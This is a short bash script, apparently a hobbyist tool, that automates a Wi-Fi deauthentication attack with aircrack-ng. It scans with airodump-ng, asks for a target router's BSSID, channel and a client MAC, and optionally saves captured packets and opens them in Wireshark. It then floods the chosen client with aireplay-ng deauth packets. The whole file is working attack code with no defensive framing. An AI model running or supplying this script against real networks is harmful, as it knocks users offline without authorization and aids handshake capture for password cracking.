#!/bin/bash
#COPYRIGHT OF Cyber-Thinker(cyb3r.think3r@gmail.com)
yellow='\033[1;33m'
red='\033[0;31m'
nc='\033[0m'
timeout --foreground -k 8 7 airodump-ng $1
echo -ne "${yellow}[+]${nc} please enter the BSSID (MAC ADDRESS OF THE TARGET ROUTER) --> "
read bssid
echo -ne "${yellow}[+}${nc} please enter the channel on which the connection is working on --> "
read channel
echo -ne "${yellow}[+]${nc} please enter the file in which you want to store the sniffed packet (no if you don't want) --> "
read file
if [[ "$file" ==  "no" ]] ; then
	timeout --foreground -k 11 10 airodump-ng --bssid $bssid --channel $channel $1
else
	timeout --foreground -k 11 10 airodump-ng --bssid $bssid --channel $channel --write $file $1 --output-format pcap
	wireshark -r "$file-01.cap" &
fi
sleep 1
echo -ne "${yellow}[+]${nc} after reading the packet in wireshark please  enter the target mac address you want to deauth --> "
read target
echo -ne "${yellow}[+]${nc} please specify how many deauth packet you want to send --> "
read packets
airodump-ng --bssid $bssid --channel $channel $1 &> /dev/null &
aireplay-ng --deauth $packets -a $bssid -c $target $1 
